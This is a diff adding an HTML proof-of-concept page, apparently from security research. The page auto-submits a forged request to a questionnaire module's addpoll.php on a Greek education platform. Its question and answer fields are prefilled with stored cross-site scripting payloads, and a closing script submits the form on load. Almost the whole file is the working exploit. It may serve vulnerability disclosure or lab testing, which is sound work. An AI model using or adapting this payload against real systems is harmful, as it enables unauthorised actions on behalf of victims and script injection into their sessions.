@@ -1,0 +1,75 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/questionnaire/addpoll.php' method='post'>
+
+<table width="99%" align="left" class="Questionnaire_Operations">
+    <thead>
+    <tr>
+      <td width="60%">Επιλογή:&nbsp;</td>
+      <td width="20%"><div align="right"><input type='submit' name='MoreMultiple' value='Νέα ερώτηση πολλαπλής επιλογής' class="toolBar_Button"></div></td>
+      <td width="20%"><div align="right"><input type='submit' size="5" name='MoreFill' value='Νέα ερώτηση συμπλήρωσης κενού' class="toolBar_Button"></div></td>
+    </tr>
+    </thead>
+    </table>
+    <br /><br />
+
+
+    <table width="99%" class='FormData'>
+    <tbody>
+    <tr>
+      <th class="left" width="220">&nbsp;</th>
+      <td><b>Ερωτηματολόγιο</b></td>
+    </tr>
+    <tr>
+      <th class='left'>Τίτλος</th>
+      <td><input type='text' size='50' name='PollName' class='FormData_InputText' value='&lt;script&gt;alert('></td>
+    </tr>
+    <tr>
+      <th class='left'>Έναρξη</th>
+      <td><input style="width: 15em; color: #840; background-color: #fff; border: 1px dotted #000; text-align: center" name="PollStart" value="2018-04-18" id="f-calendar-field-1" type="text" /><a href="#" id="f-calendar-trigger-1"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%Y-%m-%d","daFormat": "%Y/%m/%d","showsTime":false,"showOthers":true,"inputField": "f-calendar-field-1","button": "f-calendar-trigger-1"});</script></td></tr>
+    <tr>
+      <th class='left'>Λήξη</th>
+      <td><input style="width: 15em; color: #840; background-color: #fff; border: 1px dotted #000; text-align: center" name="PollEnd" value="2019-04-18" id="f-calendar-field-2" type="text" /><a href="#" id="f-calendar-trigger-2"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%Y-%m-%d","daFormat": "%Y/%m/%d","showsTime":false,"showOthers":true,"inputField": "f-calendar-field-2","button": "f-calendar-trigger-2"});</script></td>
+    </tr>
+    </tbody>
+    </table>
+    <br />
+    <table width="99%" class='Questionnaire'>
+    <tbody>
+    <tr>
+      <th class="left" width="220"><b>Ερώτηση #1</b><br><small>Πολλαπλής Επιλογής</small></th>
+      <td>
+      <input type='text' name='question[0]' value="<script>alert('xss')</script>" size='52' class='FormData_InputText'>
+      <input type='hidden' name='question_type[0]' value='1'>
+      </td>
+    </tr>
+    <tr>
+      <td class="left">Απαντήσεις:<br><br>
+      Προσθήκη απαντήσεων:
+      <input type='submit' name='MoreAnswers0' value='+'>
+      </td>
+      <td>
+        <img src='../../images/arrow_blue.gif' alt='Απαντήσεις' title='Απαντήσεις'>&nbsp;&nbsp;<input type='text' name='answer0[]' value="<script>alert('xss')</script>" size='50' class='FormData_InputText'><br><br>
+        <img src='../../images/arrow_blue.gif' alt='Απαντήσεις' title='Απαντήσεις'>&nbsp;&nbsp;<input type='text' name='answer0[]' value="<script>alert('xss')</script>" size='50' class='FormData_InputText'><br><br>
+        <img src='../../images/arrow_blue.gif' alt='Απαντήσεις' title='Απαντήσεις'>&nbsp;&nbsp;Δεν ξέρω / Δεν απαντώ
+      </td>
+    </tr>
+
+    </tbody>
+    </table>
+    <br />
+
+    <table width="99%" class="FormData">
+    <tbody>
+    <tr>
+      <th width="220">&nbsp;</th>
+      <td>
+      <input type="text" name="PollCreate" value="Δημιουργία Ερωτηματολογίου">
+      </td>
+    </tr>
+    </tbody>
+    </table>
+
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
